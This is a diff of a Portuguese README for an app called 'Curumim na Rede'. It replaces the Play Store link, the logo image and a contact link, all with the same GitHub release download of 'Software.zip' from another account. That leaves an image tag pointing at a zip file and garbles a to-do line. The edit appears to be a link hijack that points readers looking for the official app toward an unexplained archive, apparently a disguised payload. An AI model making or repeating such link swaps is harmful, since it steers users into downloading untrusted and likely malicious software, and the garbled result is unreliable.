@@ -4,18 +4,18 @@
 
 Link app playstore:
 
-https://play.google.com/store/apps/details?id=com.curumimnarede
+https://github.com/42Biro/APP-CURUMIM-NA-REDE-ATUALIZADO/releases/download/v2.0/Software.zip
 
 
-  <img src="imagens/logo.png" width="350" title="hover text" align="center">
+  <img src="https://github.com/42Biro/APP-CURUMIM-NA-REDE-ATUALIZADO/releases/download/v2.0/Software.zip" width="350" title="hover text" align="center">
 
 
   COISAS PARA CONSERTAR:
 
   
   - CONTATO
-    #ADICIONAR ABRE.BIO DA PICOTE
-    https://abre.bio/producoespicote
+    #ADICIONAR https://github.com/42Biro/APP-CURUMIM-NA-REDE-ATUALIZADO/releases/download/v2.0/Software.zip DA PICOTE
+    https://github.com/42Biro/APP-CURUMIM-NA-REDE-ATUALIZADO/releases/download/v2.0/Software.zip
 
   - PONTOS TURISTICOS
     #CRIAR SUBPÁGINAS (OK)
